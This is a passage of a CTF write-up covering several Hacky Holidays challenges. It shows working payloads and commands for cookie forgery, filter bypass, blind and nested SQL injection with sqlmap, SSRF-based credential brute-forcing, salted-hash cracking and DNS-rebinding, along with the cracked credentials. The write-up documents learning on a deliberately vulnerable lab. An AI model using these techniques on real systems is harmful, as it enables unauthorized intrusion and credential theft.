Ok! Let's try this out! I logged in with the username access and the password computer. I wasn't expecting what came next.
<image_15>
Seems I've been tricked again by the Grinch. Luckily this took much less time to figure out. There was nothing on the page (source code, javascript files).
I noticed the cookie has an interesting format. It's a Base 64 for a session cookie.
<image_16>
What if I change the admin parameter in the JSON to true? Magic hopefully happens! Did I mention how much I enjoy the Inspector functionality from Burp?! It's really awesome
The new cookie should look like this:
Code 80 Bytes
1eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
And magic does happen. Sending a request to the page with session cookie reveals a secret file at https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip (in case the server will be shut down, this is the archive my_secure_files_not_for_you.zip (F1139792)).
Well, that's juicy! What could the fluffy beast hide in here? I downloaded the file and tried to read the contents, but they are password-protected... Let's try to use John the Ripper for this one.
Code 914 Bytes
1> 7z l my_secure_files_not_for_you.zip
2   Date      Time    Attr         Size   Compressed  Name
3------------------- ----- ------------ ------------  ------------------------
42020-12-16 18:41:29 .....       215058       215105  xxx.png
52020-12-16 18:22:20 .....           43           55  flag.txt
6------------------- ----- ------------ ------------  ------------------------
72020-12-16 18:41:29             215101       215160  2 files
8
9> zip2john my_secure_files_not_for_you.zip > zip.hashes
10ver 2.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/xxx.png PKZIP Encr: 2b chk, TS_chk, cmplen=215105, decmplen=215058, crc=277DEE70
11ver 1.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=55, decmplen=43, crc=9DE7C581
12
13> john --show zip.hashes
14my_secure_files_not_for_you.zip:hahahaha::my_secure_files_not_for_you.zip:flag.txt, xxx.png:my_secure_files_not_for_you.zip
It didn't take much to get the password.
Code 195 Bytes
1> unzip -P hahahaha my_secure_files_not_for_you.zip
2Archive:  my_secure_files_not_for_you.zip
3  inflating: xxx.png
4 extracting: flag.txt
5
6> cat flag.txt
7flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Will I catch the Grinch in time? Things are getting harder by the day.
Challenge VI - My Diary 📅
Good morning to everyone following the Anti Grinch Adventures! The challenge for today is the personal Diary of the big man himself, Mr. Grinch.
<image_17>
The first step is to analyze the application. And directory bruteforcing, of course.
<image_18>
Dirbusting returned with nothing. Analyzing the URL, I observed a template parameter with the value entries.html.
Code 161 Bytes
1> ffuf -u 'https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ' -w $COMMONDIR -fc 302
2index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
I checked out the page at /my-diary/?template=index.php, and it's a full-on Source Code Leak. Wowza! The Grinch really needs some help with the security of his services!
Code 554 Bytes
1<?php
2if (isset($_GET["template"])) {
3    $page = $_GET["template"];
4    // remove non allowed characters
5    $page = preg_replace("/([^a-zA-Z0-9.])/", "", $page);
6    // protect admin.php from being read
7    $page = str_replace("admin.php", "", $page);
8    // I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php", "", $page);
10
11    if (file_exists($page)) {
12        echo file_get_contents($page);
13    } else { // redirect to home
14        header("Location: /my-diary/?template=entries.html");
15    }
16}
From this code, I figured out that the important thing we want to get is secretadmin.php. It can't be accessed directly. Path Traversal is completely blocked with the first preg_replace, because / is not allowed.
This is a common case of bad filtering. In this scenario, I can't use admin.php directly as the value. But I can use adadmin.phpmin.php. The value from inside will be removed, but because the replacement is not applied recursively, the value from outside will stay as-is.
It gets a bit more complicated with secretadmin.php because it contains the word admin.php. My solution is the following secretadsecretadadmin.phpmin.phpmin.php.
<image_19>
Now I know what the Grinch is planning! Launch DDoS Against Santa's Workshop! on the 23rd of December. That's the evilest thing a hacker Grinch can do!
Challenge VII - Hate Mail Generator 📫
<image_20>
The application is quite interesting. It contains a page listing the email campaigns that have been sent—the possibility of creating new email campaigns and previewing them. Sending an email campaign doesn't work.
The templating code looks similar to Mustache or Jinja2. So naturally, I thought of Server-Side Template Injection and consulted the faithful documentation of Payload All The Things. But sadly, nothing worked.
Running out of ideas this quick, I ran a directory bruteforce:
Code 238 Bytes
1> ffuf -u 'https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ' -w $COMMONDIR -mc all -fc 404
2new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
3templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
I know what /new endpoint does. But the /templates is still unknown. Visiting https://hackyholidays.h1ctf.com/hate-mail-generator/templates, I bump into a public directory listing.
<image_21>
It's disclosing 3 files. They can't be accessed directly. And the header and footer files have been used before in the campaign that has already been sent by the Grinch. The other template, namely 38dhs_admins_only_header.html, wasn't used anywhere yet and seems a bit private.
I started playing with the mail generator preview and the {{template:..}} functionality in the Burp Repeater. Protip: It's a lot easier to use the multipart encoding when sending POST requests if the application accepts it because this way, I avoid URL encoding/decoding.
<image_22>
Markup	Status
{{template:cbdj3_grinch_header.html}}	Works
{{template:cbdj3_grinch_footer.html}}	Works
{{template:38dhs_admins_only_header.html}}	You do not have access
{{template:./cbdj3_grinch_header.html}}	Cannot find template file /templates/.cbdj3_grinch_header.html
{{template:../templates/cbdj3_grinch_header.html}}	Cannot find template file /templates/..templatescbdj3_grinch_header.html
{{template:./test/../cbdj3_grinch_header.html}}	Cannot find template file /templates/.test..cbdj3_grinch_header.html
{{template:{{name}}}}	Missing key name}} in dataset
The last one might be interesting. I added name}} to the dataset, and the result was {{template:test. Then playing with this payload appended to one of the initial markups, I found it quite interesting that it had different behavior.
<image_23>
This one took a bit of luck to exploit.
Challenge VIII - Forum 💬
<image_24>
Analyzing the application and running directory bruteforce. The usual start.
Looks like a simple forum. But the results from ffuf reveal an interesting endpoint at /phpmyadmin. The Security Team from Grinch Networks missed this important application. I tried default credentials with root:root and some simple combinations but with no luck.
<image_25>
I tried a lot of stuff on the forum application and the login. I tried to send post requests directly to the endpoints. I tried bruteforcing for parameters. I tried looking for leaks in the source code. There was nothing!!!
I figured what the hell, let's try Google Dorks for "Grinch Networks". I've been collecting interesting Google Dorks for a while now from Twitter, and I rarely get to use them. Here is my list chall08_dorks.txt (F1139812) and I usually use a bash replace and open them all up with Google Chrome from the command line.
One with interesting results was site:github.com grinch networks. The first result was the Github of the Grinch. He contributed to a repository named Forum in the Grinch-Networks organization. *The plot thickens!*
I cloned the repository locally and started source code review. Weird, but the application looks really tight. Nothing vulnerable that could be used to help Santa.
I checked the commits on GitHub because there were only 4 of them. So I clicked on each one, one by one. The second commit includes the username and password for the database. YES!!
<image_26>
And the credentials worked on https://hackyholidays.h1ctf.com/forum/phpmyadmin. There are 4 tables.
Table	Rows
comment	N/A
post	N/A
section	N/A
user	2
Only the user table is accessible and contains two rows.
id	username	password	admin
1	grinch	35D652126CA1706B59DB02C93E0C9FBF	1
2	max	388E015BC43980947FCE0E5DB16481D1	
I'm usually in hyperdrive when I find things like this. I went fast, fast, fast to the next step and the next step like in a trance!
The password looks like an MD5. I try these with online services like https://hashtoolkit.com/ and https://crackstation.net/. Only the second online hash cracker worked and found BahHumbug for the grinch's password.
For anyone wondering what the word means, like myself, here is the definition from Urban Dictionary:
An expression used to show disgust at the Christmas season, made famous by the fictional character Ebinizer Scrooge in the Charles Dickens novel 'A Christmas Carol'.
Guy: I love Christmas, Don't you, Mr. Scrooge?
Scrooge: Bah Humbug
I logged in at https://hackyholidays.h1ctf.com/forum/login with grinch:BahHumbug credentials and accessed the Secret Plans.
<image_27>
The Grinch must be stopped!
Challenge IX - Evil Quiz ❓
<image_28>
I think the Grinch may have started recruiting for his evil army. I started analyzing the application and bruteforcing for directories.
The only inputs here are the name and the answers to the quiz. There isn't much room to mingle. My first thought was Blind Cross-Site Scripting. I use XSS Hunter for this, and I spray and pray.
Nothing happened. It was time to rethink my approach!
I observed an interesting little thing on the last page of the quiz.
There is 56 other player(s) with the same name as you!
My spidey-senses told me this might be an SQL Injection? There's only one way to find out. Try a bunch of
basic payloads until something works!
Name	Num of Players
test	56
grinch	17
reallyuniquename1283823	1
nytr0gen	1
test'	0
test"	1
So far, I can see that any name will have at least one other player with the same name. This means that the query is not filtering out my quiz response. But then, why does test' responds with 0 instead of 1.
I think the query looks something like this.
Code 60 Bytes
1SELECT COUNT(*)
2FROM quiz_answers
3WHERE name = '$input_name'
In this scenario, a double quote will not affect the response, but a single quote will break it. This means that if I send test' or 1='1, the answer will not be 1 or 0; it will be the total number of answers!
<image_29>
Note: I took the liberty of answering like a Grinch soldier would to this quiz, just to see what happens.
And it worked! This looks like a Boolean-based SQL Injection. It's time to use sqlmap to help me with dumping data from the database! I'm not the best at using this tool, and I have consulted the documentation a lot to do this. I do prefer it because it's really useful for dumping everything.
The other option would have been to write a script to make both requests, and write all the queries by hand, then have a binary search for the characters—kind of boring.
Code 407 Bytes
1sqlmap -u "https://hackyholidays.h1ctf.com/evil-quiz" \
2    --data="name=nytr0gen" \
3    --cookie="session=25677e0c322966d2d4cc71b2c3e49e86" \
4    --drop-set-cookie --ignore-redirects \
5    -p name --dbms=mysql --prefix="'" \
6    --technique=B \
7    --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" \
8    --string="is 1 other" \
9    --proxy="http://localhost:8080/" \
10    --save=$PWD/quiz.conf
This is the mighty initial command. Let's break it down.
The parameter -u is for the target URL
The parameter --data is attaching the POST data parameters
The parameter --cookie is for setting the cookie. The vulnerable parameter name is attached to the session. To be able to see the response in the second request, the cookie needs to be preserved. Note: I used my cookie session after completing the quiz, and it seems it is the only way it works to bypass the actual quiz and make only 2 requests instead of 3.
The parameter --drop-set-cookie is to ignore the set-cookie header after the POST request.
The parameter --ignore-redirects is to ignore the redirect to completing the quiz.
The parameter -p is to point to the vulnerable parameter.
The parameter --dbms is to help sqlmap a little by setting the correct database. My assumption is that it's MySQL.
The parameter --prefix is really helpful here because I already figured out how the query is formed, so I'm basically helping sqlmap figure things out faster.
I've been looking for this one for a while now. The parameter --technique forces the technique used to be Boolean / Time Based / Union / etc. In this case, it's set to Boolean.
The parameter --second-url is where the actual magic happens. Because the request is sent to one endpoint and the result from the vulnerable query happens on another, I used this parameter to point to that page.
The parameter --string is a little bit tricky. Sqlmap didn't figure out on its own about how things are changing on that page for successful queries. I don't blame you. I blame myself. I figured I could help a little by pointing out the right phrase for a successful query. Note: The name has to be unique, but it has to be used one more time on another session. Because if it's not used at all, it will result in 0. And if I would have used test, that name might have gained more people.
The parameter --proxy is so that I can see everything in Burp Suite.
The parameter --save is really important because it saves all those commands in a config file that can later be referenced when dumping the database.
Let's start talking business.
Code 872 Bytes
1> sqlmap -u "https://hackyholidays.h1ctf.com/evil-quiz" \
2    --data="name=nytr0gen" \
3    --cookie="session=25677e0c322966d2d4cc71b2c3e49e86" \
4    --drop-set-cookie --ignore-redirects \
5    -p name --dbms=mysql --prefix="'" \
6    --technique=B \
7    --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" \
8    --string="is 1 other" \
9    --proxy="http://localhost:8080/" \
10    --save=$PWD/quiz.conf
11
12        ___
13       __H__
14 ___ ___[)]_____ ___ ___  {1.4.12#stable}
15|_ -| . [']     | .'| . |
16|___|_  [.]_|_|_|__,|  _|
17      |_|V...       |_|   http://sqlmap.org
18
19sqlmap identified the following injection point(s) with a total of 16 HTTP(s) requests:
20---
21Parameter: name (POST)
22    Type: boolean-based blind
23    Title: AND boolean-based blind - WHERE or HAVING clause
24    Payload: name=nytr0gen' AND 5126=5126 AND 'JwkO'='JwkO
25---
26back-end DBMS: MySQL >= 8.0.0
With the payload discovered by sqlmap and the config file saved, I can run the next couple of commands more easily. I need to get the current database, then the tables of the database, then the columns of my target table, and finally the rows.
Code 746 Bytes
1> sqlmap -c $PWD/quiz.conf --current-db
2current database: 'quiz'
3
4> sqlmap -c $PWD/quiz.conf -D quiz --tables
5Database: quiz
6[2 tables]
7+-------+
8| admin |
9| quiz  |
10+-------+
11
12> sqlmap -c $PWD/quiz.conf -D quiz -T admin --columns
13Database: quiz
14Table: admin
15[3 columns]
16+----------+--------------+
17| Column   | Type         |
18+----------+--------------+
19| id       | int          |
20| password | varchar(250) |
21| username | varchar(250) |
22+----------+--------------+
23
24> sqlmap -c $PWD/quiz.conf -D quiz -T admin --dump
25Database: quiz
26Table: admin
27[1 entry]
28+----+-------------------+----------+
29| id | password          | username |
30+----+-------------------+----------+
31| 1  | S3creT_p4ssw0rd-$ | admin    |
32+----+-------------------+----------+
Nice! It took a bit to get these all out. In retrospection, I could've scripted it :)))
Using the username and the password gets me inside the Admin Area, which contains the flag.
<image_30>
I am close! The Grinch must be scared. Only a few days until Christmas.
Challenge X - Signup Manager 💾
<image_31>
Analyzing the application and running directory bruteforce. Not much to be seen. It's a simple application for applying to the Grinch Evil Army! I guess the quiz must have been taken into consideration for this application.
Something interesting I noticed in the source code is a comment to See README.md for assistance. I hastily accessed https://hackyholidays.h1ctf.com/signup-manager/README.md and was met with the following file.
<image_32>
My next move was to download signupmanager.zip. Oh, and the default login didn't work. That would have been too easy :)))
Code 456 Bytes
1> wget 'https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip'
2Connecting to hackyholidays.h1ctf.com (hackyholidays.h1ctf.com)|18.216.153.32|:443... connected.
3HTTP request sent, awaiting response... 200 OK
4Length: 4118 (4.0K) [application/zip]
5Saving to: 'signupmanager.zip'
6
7> unzip signupmanager.zip
8Archive:  signupmanager.zip
9  inflating: README.md
10  inflating: admin.php
11  inflating: index.php
12  inflating: signup.php
13  inflating: user.php
To spare the unnecessary details for the story, only index.php was interesting from all of these.
Code 1.86 KiB
1<?php
2// -- snip --
3function addUser($username, $password, $age, $firstname, $lastname) {
4    $random_hash = md5(print_r($_SERVER, true) . print_r($_POST, true) . date("U") . microtime() . rand());
5    $line = "";
6    $line .= str_pad($username, 15, "#");
7    $line .= $password;
8    $line .= $random_hash;
9    $line .= str_pad($age, 3, "#");
10    $line .= str_pad($firstname, 15, "#");
11    $line .= str_pad($lastname, 15, "#");
12    $line .= "N";
13    $line = substr($line, 0, 113);
14    file_put_contents("users.txt", $line . PHP_EOL, FILE_APPEND);
15    return $random_hash;
16}
17$all_users = buildUsers(); // parses users.txt
18$page = "signup.php";
19// -- snip --
20if ($page == "signup.php") {
21    $errors = array();
22    if (isset($_POST["action"])) {
23        // -- snip --
24        if ($_POST["action"] == "signup" && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
25            $username = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["username"]), 0, 15);
26            if (isset($all_users[$username])) {
27                $errors[] = "Username already exists";
28            }
29            $password  = md5($_POST["password"]);
30            $firstname = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["firstname"]), 0, 15);
31            $lastname = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["lastname"]), 0, 15);
32            if (!is_numeric($_POST["age"]) || strlen($_POST["age"]) > 3) {
33                $errors[] = "Age entered is invalid";
34            }
35            $age = intval($_POST["age"]);
36            if (count($errors) === 0) {
37                $cookie = addUser($username, $password, $age, $firstname, $lastname);
38                setcookie("token", $cookie, time() + 3600);
39                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
40                exit();
41            }
42        }
43    }
44}
45include_once $page;
This is the important part of the code.
So, the addUser function and how it works makes me think of a Content Injection attack. This kind of vulnerability is really hard to notice, especially without source code review. I have written in the past a writeup for a similar challenge from Google CTF, which I believe has an interesting scenario and is worth reading.
My goal is to have a Y in the admin column.
Ok, but HOW? Username, First Name, and Last Name are all restricting characters. Password is using MD5 Hashing, which is fixed-length to 32 characters. Age? It's a number.
I've taken it all in, then chased my tail for a few hours until I figured out how this can be attacked.
Well, I finally did a Google search for intval and found out it accepts a bunch of stuff, not only digits. The interesting thing is that it accepts and transforms Scientific E notation. For example: 1e1 == 10, 1e2 == 100, 1e3 = 1000. So, the age is limited to 3 chars, but with this, it can be as long as 10 characters. I didn't want to abuse my newfound powers, so I only used 1e3 to push the line by one character. Anything from 1e3 to 1e9 will work here. I intercepted the request in Burp and manually changed the value of the age.
Username: nytr0gen
Password: test
Age: 1e3
First Name: test
Last Name: YYYYYYYYYYYYYYY
Registered with these credentials and got the flag. Also, a link to the next step at /r3c0n_server_4fdk59
<image_33>
Challenge XI - Recon Server 💉🤯
The Grinch has been tracking Santa Claus for the last few years, trying to locate his secret workshop. I've gained access to the server that hosts the photo albums. Let's take a look inside!
It's strange that the picture link looks like this https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpb.... That's a Base 64. A juicy one.
Code 314 Bytes
1> echo 'eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9' | base64 -d | jq
2{
3  "image": "r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg",
4  "auth": "94fb398d78b36e7c079e7560ce9df721"
5}
Trying to view that image directly will result in an error. That means I really need this JSON.
Changing anything in the auth parameter resulted in an error. The same for the image parameter. That means the auth parameter is a verification hash for the image.
I didn't really want to try to bruteforce that hash :)) That's basically the last measure.
I did a directory bruteforce that uncovered some stuff.
Code 376 Bytes
1> ffuf -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ' -w $COMMONDIR -mc all -fc 404
2api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
3api/experiments         [Status: 401, Size: 64, Words: 9, Lines: 1]
4picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
5uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
I know picture and uploads. But api is new. Note: /api/experiments is a false positive because /api/anythingandeverything will respond with 401 as well.
<image_34>
These look interesting, but from my point of view, I keep getting 401 and 404—possibly randomly :)). I did bruteforce with bigger lists, bruteforcing parameters, looked for hidden comments, searched for GitHub leaks.
I realized I might not have given enough attention to the /album?hash=jdh34k. I tried the classic single quote and double quote, hopeful that I can trigger an error. Nothing. What about jdh34k' and 1='1. This incredibly worked.
Now I wanted to get this one by hand, just because I spent so much figuring out sqlmap for the other challenge, I was tired of it. I've gone old school. There's this really nice tutorial that might be helpful to follow along.
Payload	Status Code
jdh34k' and 1='1	200
jdh34k' and 1='0	404
jdh34k' and 1='1';--	200
This one looks like it might be possible to output the results with UNION. The first step is to determine the number of columns with ORDER BY. The payload is jdh34k' order by 3;--. Then use UNION to see the possible outputs. Final payload is jdh34k' and 1=0 union all select 1,2,3;--.
<image_35>
I noticed here that only the 3 is reflected on the page. Maybe the other two parameters are used for some stuff. Also, there are 2 photos on the page. If I change the 1 to a 2 or a 3, the number of photos will change as well. Anything else, and the photos will disappear.
I finally gave in and used sqlmap to have a better understanding of what I'm dealing with. I dumped everything. Using the data I got, I built the following diagram:
<image_36>
Following the diagram, the vulnerable query should look something like this:
Code 59 Bytes
1SELECT id, hash, name
2FROM album
3WHERE hash = '$input_hash'
Something also noteworthy from the diagram is that the auth parameter is not in the database. That means it might be generated at runtime? This gives me hope for a Server Side Request Forgery attack.
Going forward, I already figured out that the hash column might be useless. And in my mind, the id was somehow used to get these photos. And maybe that photos query is vulnerable as well. Tried the same payload, 1' and 1='1, and I got the same number of photos. Tried 1='0, and I got no photos as a result. LOL! This will be tough!
So basically, my initial payload was jdh34k' and 1=0 union all select 1,2,3;--, and the vulnerable parameter is 1. So the new payload is jdh34k' and 1=0 union all select "1' and 1='1",2,3;--... That's sick!
For simplicity, the table of payloads from below will include only the vulnerable parameter from inside:
Payload	Num of Photos
1' and 1='1	2
1' and 1='0	0
1' order by 3;--	2
1' order by 4;--	0
1' and 1=0 union all select 4,5,6;--	1
The plot thickens. The final payload is jdh34k' and 1=0 union all select "1' and 1=0 union all select 4,5,6;--;--",2,3;--. That's a handful!
The photo that appears has the image set to r3c0n_server_4fdk59/uploads/6 with a valid auth. I got this!
<image_37>
Just for the fun of it, the query for getting the photos should be something like:
Code 74 Bytes
1SELECT id, album_id, photo
2FROM photos
3WHERE album_id = '$result_album_id'
And a Path Traversal should be possible from this point with ../. I already know I should be targeting /api. Only need to write a proper script to make the requests.
And I did. The script can be seen by downloading brute_dirs.py (F1139742). I ran it once with the common wordlist, noticed a bunch of Expected HTTP status 200, Received 404, filtered these out, ran it again.
Code 106 Bytes
1> python brute_dirs.py
2/api/ping - Invalid content type detected
3/api/user - Invalid content type detected
It seems that for status code 200, it will not show the result unless the Content-Type matches the one of an image. This is unfortunate, and my SSRF seems to be a Blind SSRF. But maybe status codes will suffice.
Let's try to find parameters, I guess. For /api/ping, I didn't find a thing. But for /api/user, the gods favored me. The parameters are taken from burp-parameter-names.txt wordlist from SecLists. Oh, and the script is a bit modified brute_params.py (F1139743).
Code 156 Bytes
1> python brute_params.py
2/api/user?username=test - Expected HTTP status 200, Received: 204
3/api/user?password=test - Expected HTTP status 200, Received: 204
I found the parameters to be username and password. And they do seem to work separately. My intuition tells me that if this endpoint was meant for internal usage, it should be working as a search. The first thing I tried is if the endpoint was accepting wildcards (% and _). More details about this type of query in this article about SQL LIKE operator.
I tried some requests by hand (with the help of my script to sign it). Note: The percent sign % is URL encoded in the table below as %25.
URL	Response
/api/user?username=test	Expected HTTP status 200, Received: 204
/api/user?username=%25	Invalid content type detected
/api/user?username=a%25	Expected HTTP status 200, Received: 204
/api/user?username=g%25	Invalid content type detected
/api/user?username=gr%25	Invalid content type detected
Yes! My theory of the internal user search is valid. I changed the script a little bit and ran it. Final changes can be seen by downloading brute_credentials.py (F1139741).
Code 220 Bytes
1> python brute_credentials.py username
2g
3gr
4gri
5grin
6grinc
7grinch
8grincha
9grinchad
10grinchadm
11grinchadmi
12grinchadmin
13
14> python brute_credentials.py password
15s
16s4
17s4n
18s4nt
19s4nt4
20s4nt4s
21s4nt4su
22s4nt4suc
23s4nt4suck
24s4nt4sucks
The credentials are:
Username: grinchadmin
Password: s4nt4sucks
And the next step seems to be the login page at https://hackyholidays.h1ctf.com/attack-box/login. Using the credentials I found, I got access to the Grinch Network Attack Server. I finally feel like I have a chance to stop the bad guy!
<image_38>
Challenge XII - Attack Box 💣
<image_39>
This is it! The final battle! Will the Grinch succeed in destroying Christmas for everyone? Or will I be able to save Santa's servers? Keep watching!
With the credentials found in the previous challenge, I was able to login to Grinch Network Attack Server. Here I can see 3 IP Addresses and buttons to attack them. These IPs must be Santa's key servers.
The flow of the application is the following:
Fixed IP Addresses are presented with a base64 payload for the attack.
Clicking on any of them will load /launch?payload=eyJ0.... Each server has a unique IP address and a unique hash inside that Base64 encoded JSON.
The launch endpoint will generate an unique hash for the attack. In my preview that is /launch/cc2f348ccc3d7d77db26a344910f7150.
This page makes JSON requests to /launch/cc2f348ccc3d7d77db26a344910f7150.json?id=0 to check for new updates, keeping count of the last ID.
And that's about all there is here. I tried directory bruteforcing and everything else I could think of.
There are two inputs I see here that can be abused.
The first potential input is the id parameter on the API endpoint. I tried SQL Injection again, but no luck this time. What about IDOR, an access control vulnerability? Nope. I gave up on this one.
The base64 encoding looks juicy. And it proved in the past to bring some results.
Code 195 Bytes
1> echo 'eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==' | base64 -d | jq
2{
3  "target": "203.0.113.33",
4  "hash": "5f2940d65ca4140cc18d0878bc398955"
5}
That hash is bound to the target. Similar to the previous challenge. But I don't see a way to generate them this time around.
Maybe the hash is generated after the host is resolved? I'm thinking that if I use an A record on a domain, resolving to 203.0.113.33, it may check the hash only after resolving the DNS.
There's this interesting service that I use from alf.nu/DNS. To have an A record for that IP, I must simply use 203-0-113-33.4i.am. I tried, and the response was Invalid Protection Hash.
I tried spaces before and after the IP address, I tried converting the IP to a bunch of weird formats at vultr.com/resources/ipv4-converter/. I was about to give up. I actually went to sleep early that day because I had no more ideas to break this up.
Then the idea came to me. As if I was getting inspiration from a higher power. Woke up with the energy to break this apart!
So the protection hash is using MD5. Easy to spot because it's kind of the only hash with 32 characters hexadecimal. Side Note: SHA1 has 40 characters hexadecimal. This might come in handy.
And the hash is possibly salted or transformed in some way. Because md5("203.0.113.33") != "5f2940d65ca4140cc18d0878bc398955". And the tools I used in one of the previous challenges couldn't find a match for any of the three hashes.
My idea was that the hash might be built in one of the following ways:
md5("203.0.113.33" + "RANDOM_WORD")
md5("RANDOM_WORD" + "203.0.113.33")
I read this nice tutorial about cracking salted MD5 and went to work. Oh, let's not forget the important part, I downloaded the rockyou.txt wordlist from github.com/brannondorsey/naive-hashcat/releases/.
I created a file with the 3 hashes I found and their corresponding IPs. I added a test hash to be sure that everything worked properly and saved them as hashes.txt.
Code 176 Bytes
15f2940d65ca4140cc18d0878bc398955:203.0.113.33
22814f9c7311a82f1b822585039f62607:203.0.113.53
35aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
405a671c66aefea124cc08b76ea6d30bb:test
I ran two hashcat commands, each one for a different hash+salt scheme.
Code 948 Bytes
1> hashcat -m 20 -a 0 hashes.txt ./rockyou.txt
2hashcat (v6.1.1) starting...
3
4Hashes: 4 digests; 4 unique digests, 4 unique salts
5
6Dictionary cache hit:
7* Filename..: ./rockyou.txt
8* Passwords.: 14344384
9
1005a671c66aefea124cc08b76ea6d30bb:test:test
11
12Session..........: hashcat
13Status...........: Exhausted
14Hash.Name........: md5($salt.$pass)
15Hash.Target......: hashes.txt
16Guess.Base.......: File (./rockyou.txt)
17
18> hashcat -m 10 -a 0 hashes.txt ./rockyou.txt
19hashcat (v6.1.1) starting...
20
21Hashes: 4 digests; 4 unique digests, 4 unique salts
22
23Dictionary cache hit:
24* Filename..: ./rockyou.txt
25* Passwords.: 14344384
26
275f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
282814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
295aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
30
31Session..........: hashcat
32Status...........: Cracked
33Hash.Name........: md5($pass.$salt)
34Hash.Target......: hashes.txt
35Guess.Base.......: File (./rockyou.txt)
That went smooth. The Protection Hash is MD5 salted with the word mrgrinch463.
The complicated part comes with encoding everything. I have to base64 encode a JSON with a variable target and an MD5 based on that target and a salt. Easy peasy, that's like 5 steps :)). I was thinking of using CyberChef, but I also realized I never used Hackvertor before. What's there to lose?
I was really impressed with the diversity of options and how intuitive it is to use. I built an encoding in the extension's interface, tested it to see if the output matches what I need, then used the encoding input into Burp Repeater to test different targets because the extension encodes the stuff automagically while sending the request.
<image_40>
Believe me, I tried to use IP addresses that I control in there, and I didn't get any ping from the Grinch Network Attack Server. It seems like it is not yet working. Maybe it's in Demo Mode at the moment. I don't know. It doesn't seem to bring down Santa's servers either. It means I still have time.
It does resolve DNS. If I input a domain name, it gets resolved. Using requestbin.net/dns, I can see a hit from AWS IPs, but nothing interesting there.
<image_41>
The mission is to "find a way to stop the Grinch from launching the Denial of Service attack". What if I try to DDOS the Grinch's server.
I can do that by launching an attack to localhost.
<image_42>
This was not about to be that easy! One thing I noticed is that in the response, there are two places where the domain name is resolved. If the domain name has two A records, the first resolve will point to one record, and the second resolve will point to the other one! That could be useful because the localhost check seems to be made after the first resolve.
This is tricky to get right. Sometimes it works on the first try. Sometimes it needs 10-20 retries. But it eventually works.
I used alf.nu/DNS for this one with the following payload 1s.203-0-113-33.but-50-pct.127-0-0-1.4i.am.
<image_43>
Luckily, it worked the first time. I've taken down Grinch Networks and saved the holidays!
<image_44>
Ending Notes 📜
This CTF has exceeded all my expectations. I expected some chill and easy challenges for the holidays and met hardcore vulnerabilities from very creative organizers. And I finally had the opportunity to understand how to use sqlmap the right way!
It's been a fantastic CTF. I'm grateful for the amazing creators of the challenge. And in this interesting year, I'm grateful to have spent time with my family over the holidays!
Oh, one more thing! I thought I was saving Christmas alone this holiday season. I found out, after I finished the challenge, that I am never alone. A lot of people went after the Grinch on the Hacker101 Discord.
In the end, I'd like to thank the Grinch for helping all of us appreciate more this time of the year!
<image_45>
References
https://www.acunetix.com/blog/articles/blind-xss/
https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html
https://en.wikipedia.org/wiki/MD5
https://en.wikipedia.org/wiki/Universally_unique_identifier
https://alf.nu/DNS
https://gchq.github.io/CyberChef/
https://github.com/brannondorsey/naive-hashcat/releases/
https://github.com/danielmiessler/SecLists
https://github.com/ffuf/ffuf
https://github.com/s0md3v/Arjun
https://github.com/sqlmapproject/sqlmap/wiki/Usage
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
https://dbdiagram.io/home
https://medium.com/bugbountywriteup/identifying-exploiting-sql-injection-manual-automated-79c932f0c9b5
https://nytr0gen.github.io/writeups/ctf/2018/07/08/google-ctf-2018-quals.html#bookshelf-writeup
https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100
https://portswigger.net/burp/communitydownload
https://portswigger.net/support/using-sql-injection-to-bypass-authentication
https://portswigger.net/web-security/access-control/idor
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
https://portswigger.net/web-security/sql-injection
https://portswigger.net/web-security/ssrf
http://requestbin.net/dns
https://robinverton.de/blog/2012/07/15/cracking-salted-md5-with-hashcat/
http://sqlmap.org/
https://www.hacker101.com/discord
https://www.openwall.com/john/
https://www.php.net/manual/en/function.intval.php
https://www.vultr.com/resources/ipv4-converter/
https://www.w3schools.com/sql/sql_like.asp
https://xsshunter.com/
Impact
.



==================================================

Report File: 1069388.json
------------------------------
